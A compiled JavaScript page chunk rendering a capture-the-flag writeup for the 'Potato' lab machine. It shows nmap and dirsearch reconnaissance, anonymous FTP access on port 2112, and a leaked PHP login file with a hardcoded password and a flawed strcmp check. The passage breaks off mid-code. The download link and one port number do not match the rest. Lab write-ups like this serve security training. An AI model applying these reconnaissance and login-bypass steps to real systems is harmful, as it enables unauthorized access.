(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{383:function(t,s,a){"use strict";a.r(s);var n=a(44),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"potato"}},[t._v("Potato")]),t._v(" "),a("p",[t._v("Offsec proving ground Potato writeup\nYou can download the image for this machine from : ["),a("a",{attrs:{href:"https://www.vulnhub.com/entry/infosec-prep-oscp,508/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Here"),a("OutboundLink")],1),t._v("]")]),t._v(" "),a("h2",{attrs:{id:"summary"}},[t._v("Summary")]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",[t._v("Machine Name")]),t._v(" "),a("th",[t._v("IP")])])]),t._v(" "),a("tbody",[a("tr",[a("td",[t._v("Potato")]),t._v(" "),a("td",[t._v("192.168.186.101")])])])]),t._v(" "),a("h2",{attrs:{id:"foothold"}},[t._v("Foothold")]),t._v(" "),a("p",[t._v("Lets start by doing the nmap scan of the box")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ nmap -sV -sT -sC -o nmapinitial "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101                                                                                             "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("130")]),t._v(" â¨¯\nStarting Nmap "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("7.91")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v(" https://nmap.org "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" at "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2021")]),t._v("-07-30 03:57 EDT\nNmap scan report "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101\nHost is up "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v(".061s latency"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(".\nNot shown: "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("998")]),t._v(" closed ports\nPORT   STATE SERVICE VERSION\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("22")]),t._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ssh")]),t._v("     OpenSSH "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v(".2p1 Ubuntu 4ubuntu0.1 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Ubuntu Linux"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" protocol "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2.0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" ssh-hostkey: \n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3072")]),t._v(" ef:24:0e:ab:d2:b3:16:b4:4b:2e:27:c0:5f:48:79:8b "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("RSA"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("   "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("256")]),t._v(" f2:d8:35:3f:49:59:85:85:07:e6:a2:0e:65:7a:8c:4b "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ECDSA"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_  "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("256")]),t._v(" 0b:23:89:c3:c0:26:d5:64:5e:93:b7:ba:f5:14:7f:3e "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("ED25519"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("  http    Apache httpd "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2.4")]),t._v(".41 "),a("span",{pre:!0,attrs:{class:"token variable"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("((")]),t._v("Ubuntu"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("))")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_http-server-header: Apache/2.4.41 "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Ubuntu"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_http-title: Potato company\nService Info: OS: Linux"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" CPE: cpe:/o:linux:linux_kernel\n\n")])])]),a("p",[a("code",[t._v("Port 80")]),t._v(" seems interesting lets visit it. While checking for "),a("code",[t._v("POrt 80")]),t._v(" Lets run full port scan.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101 -o nmap-fullscan\n")])])]),a("p",[t._v("We just saw the static page saying "),a("strong",[t._v("Potato Company")]),t._v(" and nothing else while visiting post 80. Let's run "),a("code",[t._v("dirsearch")]),t._v(" and see if there is any hidden directory.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("dirsearch -u http://192.168.186.101/\n\n  _"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v(" _ _  _  _  _ _"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v("_    v0.4.1\n "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("||")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" _"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("/_"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("||")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("_"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nExtensions: php, aspx, jsp, html, js "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" HTTP method: GET "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" Threads: "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("30")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("|")]),t._v(" Wordlist size: "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("10877")]),t._v("\n\nOutput File: /home/avi/.dirsearch/reports/192.168.186.101/_21-07-30_04-30-21.txt\n\nError Log: /home/avi/.dirsearch/logs/errors-21-07-30_04-30-21.log\n\nTarget: http://192.168.186.101/\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:22"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Starting: \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.ht_wsr.txt                                                                                                             \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccess.bak1\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccess.orig\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccess.sample\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccess.save\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccess_extra\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccess_orig\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccess_sc\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccessOLD\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccessBAK\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htaccessOLD2\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htm            \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.html\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htpasswd_test\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.htpasswds\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:26"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.httr-oauth          \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:27"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /.php                                                   \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:37"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("301")]),t._v(" -  318B  - /admin  -"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("  http://192.168.186.101/admin/                                              \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:37"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" -  466B  - /admin/?/login                      \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:37"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /admin/.htaccess\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:38"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" -  466B  - /admin/                            \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:38"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" -  466B  - /admin/index.php                                                                              \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:38"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" -    1KB - /admin/logs/                   \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:58"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" -  245B  - /index.php                                                                                          \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:30:58"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" -  245B  - /index.php/login/         \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:31:09"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /server-status/                                                                                        \n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("04:31:09"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("403")]),t._v(" -  280B  - /server-status               \n                                                                                                                              \nTask Completed                                  \n")])])]),a("p",[t._v("We see couple of interesting directories "),a("code",[t._v("/admin")]),t._v(" "),a("code",[t._v("/admin/logs")])]),t._v(" "),a("p",[t._v("Lets visit "),a("code",[t._v("/admin/logs/")]),t._v("\nIt contains 3 logs upon visiting "),a("code",[t._v("log_03.txt")]),t._v(" we see:")]),t._v(" "),a("div",{staticClass:"language-docs extra-class"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[t._v("Operation: password change                             \nDate: August 2, 2020 / 9:25 p.m.\nUser: admin                  \nStatus: OK\n")])])]),a("p",[t._v("We got the username "),a("code",[t._v("admin")]),t._v(".")]),t._v(" "),a("p",[t._v("Lets try to login to admin panel using admin username and common passwords. But none of them worked ðŸ˜¦")]),t._v(" "),a("p",[t._v("Let's check our nmap full port scan")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101 -o nmap-fullscan\nNot shown: "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("61793")]),t._v(" closed ports, "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3739")]),t._v(" filtered ports\nPORT     STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("22")]),t._v("/tcp   "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ssh")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("80")]),t._v("/tcp   "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("  http\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2112")]),t._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("open")]),t._v("  kip\n\n")])])]),a("p",[t._v("We saw new "),a("code",[t._v("Port 2122")]),t._v(" open. Lets check whats hosted in that port.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ telnet "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2112")]),t._v("\nTrying "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("..")]),t._v(".\nConnected to "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101.\nEscape character is "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v("'^]'")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(".")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("220")]),t._v(" ProFTPD Server "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Debian"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("::ffff:192.168.186.101"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\n\n")])])]),a("p",[t._v("Looks like its FTP. Let's try anonymous login to ftp.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("ftp")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2112")]),t._v("\nConnected to "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101.\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("220")]),t._v(" ProFTPD Server "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("Debian"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("::ffff:192.168.186.101"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("\nName "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("192.168")]),t._v(".186.101:avi"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(": anonymous\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("331")]),t._v(" Anonymous login ok, send your complete email address as your password\nPassword:\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("230")]),t._v("-Welcome, archive user anonymous@192.168.49.186 "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("!")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("230")]),t._v("-\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("230")]),t._v("-The "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("local")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("time")]),t._v(" is: Fri Jul "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("30")]),t._v(" 08:39:42 "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("2021")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("230")]),t._v("-\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("230")]),t._v(" Anonymous access granted, restrictions apply\nRemote system "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("type")]),t._v(" is UNIX.\nUsing binary mode to transfer files.\nftp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" \n\n")])])]),a("p",[t._v("Successfully logged on to ftp. There are two files "),a("code",[t._v("index.php.bak")]),t._v(" and "),a("code",[t._v("welcome.msg")]),t._v(" .")]),t._v(" "),a("p",[a("code",[t._v("index.php.bak")]),t._v(" seems interesting lets download the file and see the content.")]),t._v(" "),a("div",{staticClass:"language-bash extra-class"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("ftp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" get index.php.bak /tmp/index.php\nlocal: /tmp/index.php remote: index.php.bak\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("200")]),t._v(" PORT "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v("command")]),t._v(" successful\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("150")]),t._v(" Opening BINARY mode data connection "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" index.php.bak "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("901")]),t._v(" bytes"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("226")]),t._v(" Transfer complete\n"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("901")]),t._v(" bytes received "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("in")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0.00")]),t._v(" secs "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("6.2265")]),t._v(" MB/s"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nftp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" \n\n")])])]),a("p",[t._v("Content of index.php.bak")]),t._v(" "),a("div",{staticClass:"language-php extra-class"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("html")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("head")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("head")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token tag"}},[a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("body")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[t._v("<?php")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$pass")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"potato"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//note Change this password regularly")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_GET")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'login'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("===")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"1"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("strcmp")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_POST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'username'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"admin"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),t._v("  "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&&")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("strcmp")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$_POST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'password'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$pass")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("==")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("echo")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[t._v('"Welcome! </br> Go to the <a href=\\"dashboard.php\\">dashboard</a>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("setcookie")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[t._v("'pass'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[t._v("$pass")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("time")]),a("span",{pre:!0,attrs:{class:"token 